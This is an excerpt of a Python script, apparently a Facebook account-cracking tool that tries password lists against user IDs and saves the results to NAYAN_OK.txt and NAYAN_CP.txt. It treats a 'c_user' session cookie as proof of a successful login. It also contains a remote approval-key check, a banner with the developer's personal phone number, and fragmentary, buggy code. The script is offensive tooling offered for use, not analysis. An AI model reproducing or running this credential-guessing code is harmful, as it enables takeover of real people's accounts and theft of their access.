...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            NAYAN MONDOL
     \033[1;91m➣ \033[1;91mFACEBOOK   :            NAYAN MONDOL
     \033[1;92m➣ \033[1;92mWHATSAPP   :            01791678876
     \033[1;91m➣ \033[1;91mGITHUB     :            Mr-N4Y4N
...
a=requests.get("https://github.com/Mr-N4Y4N/BD-HACK/blob/main/approve.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/N4Y4N.MONDOL')
    exit()
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mNAYAN_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mNAYAN_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back Nayan Mondol ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[NAYAN-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [NAYAN-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('NAYAN_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [NAYAN-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('NAYAN_CP.txt' , 'a').write('%s\n' % wrt)
                        break
